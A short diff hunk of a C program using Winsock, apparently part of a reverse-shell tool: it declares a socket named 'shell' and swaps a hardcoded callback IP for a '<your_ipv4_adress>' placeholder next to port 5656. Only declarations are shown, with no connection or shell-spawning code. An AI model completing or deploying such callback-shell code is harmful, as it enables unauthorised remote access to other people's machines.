@@ -12,7 +12,7 @@ SOCKET shell;
 sockaddr_in shell_addr;
 WSADATA wsa;
 
-char ip_addr[]="192.168.88.128";
+char ip_addr[]="<your_ipv4_adress>";
 int port = 5656;
 int conn;
 
